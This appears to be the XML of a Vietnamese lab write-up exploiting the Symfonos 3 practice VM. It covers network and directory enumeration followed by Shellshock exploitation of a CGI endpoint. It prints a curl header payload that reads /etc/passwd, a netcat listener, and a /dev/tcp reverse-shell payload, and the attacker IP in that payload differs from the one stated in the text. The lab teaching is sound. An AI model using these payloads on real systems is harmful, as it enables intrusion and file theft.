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614C" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="34"/>
        </w:rPr>
        <w:t>SYMFONOS 3 ENUMERATION AND EXPLOITATION</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BC56192" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">IP máy Symfonos 3: </w:t>
      </w:r>
      <w:r>
        <w:t>192.168.56.120</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E3D0A62" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">IP máy Kali: </w:t>
      </w:r>
      <w:r>
        <w:t>192.168.56.157</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C4449D" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Đường dẫn tải máy ảo và tài nguyên: </w:t>
      </w:r>
      <w:hyperlink r:id="rId8">
        <w:r>
          <w:rPr>
            <w:color w:val="0563C1"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Google Drive</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="12893446" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
        <w:t>1. Dò quét mạng và dịch vụ</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34A710DC" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Xác định địa chỉ IP của máy mục tiêu trong mạng nội bộ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="083EA0F1" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B0E8EF" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>netdiscover -i eth1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EE4F92E" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Netdiscover quét các thiết bị đang hoạt động trên giao diện eth1 và hiển thị địa chỉ IP, địa chỉ MAC của các máy trong cùng mạng. Ghi nhận máy Symfonos 3 có địa chỉ IP 192.168.56.120 để sử dụng cho các bước tiếp theo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="278292D7" w14:textId="141BCFA6" w:rsidR="00C81D4F" w:rsidRDefault="00F81291">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="09F9D878" wp14:editId="6DDA1270">
            <wp:extent cx="6153785" cy="1851660"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="146241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11943" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="1851660"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Nhận diện cổng mở, hệ điều hành và phiên bản dịch vụ trên máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57480A8F" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01CA0298" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>nmap -A 192.168.56.120</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DD23140" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tùy chọn -A kích hoạt nhận diện hệ điều hành, phiên bản dịch vụ, các script mặc định và traceroute. Kết quả quét được sử dụng để xác định bề mặt tấn công và lựa chọn dịch vụ cần kiểm tra tiếp theo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43B8284A" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả/nhận xét: </w:t>
      </w:r>
      <w:r>
        <w:t>Kết quả cần chú ý là dịch vụ HTTP và CGI trên máy mục tiêu. Thông tin cổng, phiên bản dịch vụ và hệ điều hành được ghi lại đúng theo kết quả thực tế của bài lab.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="350EEF86" w14:textId="77777777" w:rsidR="00F81291" w:rsidRDefault="00F81291">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5600EF36" wp14:editId="597369F9">
            <wp:extent cx="6153785" cy="2136775"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="34238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80799" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="2136775"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="599D9CBA" w14:textId="45E47B45" w:rsidR="00F81291" w:rsidRDefault="00F81291">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6959E719" wp14:editId="4F3B3C62">
            <wp:extent cx="6153785" cy="3101340"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:docPr id="161690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00924" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="3101340"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="76E5620B" w14:textId="3BB54B1A" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
        <w:t>2. Liệt kê thư mục và phát hiện CGI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58EF3B7A" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tìm kiếm các thư mục, tệp và tài nguyên web không được liên kết trực tiếp trên trang chính.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC99E58" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DCC8CCF" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>dirb http://192.168.56.120</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4297F8" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>DIRB thực hiện dò tìm đường dẫn web dựa trên wordlist. Kết quả giúp phát hiện thư mục gate và các tài nguyên ẩn có thể chứa manh mối hoặc điểm nhập liệu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D094B8B" w14:textId="77777777" w:rsidR="00F81291" w:rsidRDefault="00F81291">
      <w:pPr>
        <w:keepLines/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1ED2AA0F" wp14:editId="2D56BAC6">
            <wp:extent cx="6153785" cy="2885440"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="164349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7704" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="2885440"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C85821A" w14:textId="4A7ECE7C" w:rsidR="00F81291" w:rsidRDefault="00F81291">
      <w:pPr>
        <w:keepLines/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7DC447F4" wp14:editId="48D4F35B">
            <wp:extent cx="6153785" cy="2826385"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="147513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7163" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId13"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="2826385"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="733C14BE" w14:textId="005B70E7" w:rsidR="00F81291" w:rsidRDefault="00F81291">
      <w:pPr>
        <w:keepLines/>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4F070524" wp14:editId="68794F7E">
            <wp:extent cx="6153785" cy="1573530"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="162926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8709" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId14"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="1573530"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="070C350C" w14:textId="5D291B4D" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tiếp tục dò tìm sâu trong đường dẫn /gate/underworld.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5BD3A4" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FD322F4" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>dirb http://192.168.56.120/gate/underworld</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51F0C587" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Quét sâu đường dẫn đã phát hiện nhằm xác định tệp CGI hoặc tài nguyên có khả năng xử lý biến môi trường HTTP. Trong bài lab, tài nguyên đáng chú ý là /cgi-bin/underworld.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD6B28C" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả/nhận xét: </w:t>
      </w:r>
      <w:r>
        <w:t>Việc phát hiện endpoint CGI cung cấp cơ sở để kiểm tra lỗ hổng Shellshock thông qua các header HTTP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEE8CD7" w14:textId="40DF9EE0" w:rsidR="00C81D4F" w:rsidRDefault="00F81291">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5DDED0D6" wp14:editId="412FADBE">
            <wp:extent cx="6153785" cy="3167380"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="40066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65826" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="3167380"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
        <w:t>3. Kiểm tra và khai thác Shellshock</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="169DFB6F" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Kiểm tra endpoint CGI có thực thi nội dung chèn trong header HTTP hay không.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C39762" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B935E12" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://192.168.56.120/cgi-bin/underworld</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F8CBFB7" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Chuỗi () { :; }; được đặt trong User-Agent để kiểm tra lỗ hổng Shellshock. Nếu máy chủ CGI sử dụng Bash dễ bị tổn thương, phần lệnh phía sau sẽ được thực thi và trả về nội dung tệp /etc/passwd.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A3ADF7" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả/nhận xét: </w:t>
      </w:r>
      <w:r>
        <w:t>Khi nội dung /etc/passwd xuất hiện trong phản hồi, có thể xác nhận endpoint CGI tồn tại lỗ hổng Shellshock và cho phép thực thi lệnh từ xa với quyền của tiến trình web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A91AD7A" w14:textId="01E635F5" w:rsidR="00C81D4F" w:rsidRDefault="00F81291">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="77B0A422" wp14:editId="69812B24">
            <wp:extent cx="6153785" cy="2426970"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="212442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8434" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId16"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="2426970"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Mở cổng lắng nghe trên Kali để nhận reverse shell.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B906C5" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6245B185" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>nc -nlvp 4446</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B82232" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Netcat lắng nghe trên cổng 4446 của máy Kali và chờ kết nối ngược từ máy mục tiêu.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01049AB4" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Khai thác Shellshock để tạo kết nối shell ngược về máy Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28AFAA42" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="762368A9" w14:textId="1B972F9C" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="40" w:after="160"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">curl -H "Referer: () </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>{ :;};</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> /bin/bash -c /bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="00317D2B">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>05</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>/4446 0&gt;&amp;1 &amp;" http://192.168.56.120/cgi-bin/underworld</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47731A10" w14:textId="77777777" w:rsidR="00C81D4F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:keepLines/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Payload được chèn vào header Referer. Bash trên máy mục tiêu tạo một phiên shell tương tác và kết nối ngược đến 192.168.56.157:4446. Khi Netcat nhận kết nối, người kiểm thử có quyền truy cập ban đầu vào hệ thống với quyền của dịch vụ web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A225D69" w14:textId="77777777" w:rsidR="00F81291" w:rsidRDefault="00F81291">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5EF94E10" wp14:editId="791ACF18">
            <wp:extent cx="6153785" cy="1301115"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="121411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18306" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId17"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="1301115"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="170B10AD" w14:textId="1911EB1A" w:rsidR="00317D2B" w:rsidRDefault="00317D2B">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160"/>
        <w:rPr>
          <w:b/>
          <w:sz w:val="29"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5F7509D4" wp14:editId="21202174">
            <wp:extent cx="6153785" cy="770255"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="93713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37889" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId18"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6153785" cy="770255"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="477BF56A" w14:textId="12F0A42A" w:rsidR="00317D2B" w:rsidRDefault="00317D2B">
      <w:pPr>
        <w:keepNext/>
